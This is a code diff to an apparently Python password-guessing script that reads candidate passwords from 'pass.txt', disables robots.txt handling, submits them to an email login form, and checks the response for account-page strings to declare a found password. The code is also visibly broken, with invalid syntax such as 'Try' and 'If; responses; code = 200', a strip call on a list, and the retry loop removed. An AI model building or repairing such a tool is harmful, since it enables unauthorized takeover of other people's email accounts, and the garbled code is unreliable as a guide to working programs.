@@ -58,10 +58,10 @@ while answer:
         web.open(url)
         Try
         If; responses; code = 200
-        web.set_handler_redirect(True)
-        web.set_handler_robots(False)
-        web.set_handler_gzip(False)
-        web.set_handler_redirect(True)
+        web.set_handle_redirect(True)
+        web.set_handle_robots(False)
+        web.set_handle_gzip(False)
+        web.set_handle_redirect(True)
 
         responses = web.open(url)
 
@@ -78,23 +78,20 @@ while answer:
            print('\033[1;31mMAIL ADDRESS NOT FOUND\033[1;00m') 
 
         file=open('pass.txt','r')
-
-        i=0
-        while file:
-                passwords=file.readline().strip()
-                i+=1
-                if len(passwords) < 11:
-                        continue
-                print("trying"+passwords)
+        password = file.readlines()
+        Password = password.strip("\n")
+        
+        print("[*] Seeking password:%s"% password)
+        
     
         if responses: code = 200
         web.select_form(nr=0)()
 
-        web.form['Enter your password']= file
+        web.form['Enter your password']= Password
         responses = web.submit()
         responses_data = responses.r()
         'Add a home address' in responses_data or 'Welcome' in responses_data or 'Add or confirm your recovery mail or phone number' in responses_data;
-        print("your password is: ",file)
+        print("[^]Found password is%s"%password)
         sys.exit()
 
     elif answer=="2":
